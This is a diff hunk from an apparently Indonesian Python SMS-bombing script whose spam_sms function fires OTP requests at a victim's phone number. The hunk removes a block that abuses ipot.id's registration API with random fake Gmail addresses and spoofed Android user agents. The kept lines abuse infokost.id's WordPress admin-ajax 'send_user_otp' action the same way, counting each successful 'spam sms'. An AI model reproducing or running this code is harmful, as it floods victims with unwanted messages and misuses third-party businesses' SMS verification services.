@@ -57,14 +57,6 @@ def spam_sms(nomor):
 	global no
 	try:
 		# Spam Sms 1 By Ipot Id
-		nope = rc(['+62','62','0'])+nomor
-		base = ses.post("https://www.ipot.id/newstpoa/registrasi/hello_ipot", data={"level-id":"","pageName":"Registration","reg-id":0,"sessionid":""}).json()
-		date = {"email": f"babas{rr(1,99999999)}@gmail.com","emailconfirmed":"yes","handphone": nope,"level-id": "0","pageName":"Registration","reg-id":"","token-id": nope, "sessionid": base["sessionid"]}
-		ses.headers.update({"sessionid": date["sessionid"], "Accept": "application/json", "User-Agent": f"Mozilla/5.0 (Linux; Android 11; Redmi {rr(4,12)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Key": "Um9jaG1hdCBCYXN1a2k="})
-		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
-		post = ses.post(base["url"]+"/verify_email_hp", data=date).json()
-		if post["message"] == "Go OTP": no += 1; print(f"\r[{no}] sukses spam sms")
-		# Spam Sms 2 By Infokost
 		date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62"+nomor}
 		post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
 		if "ok" in post: no += 1; print(f"[{no}] sukses spam sms")
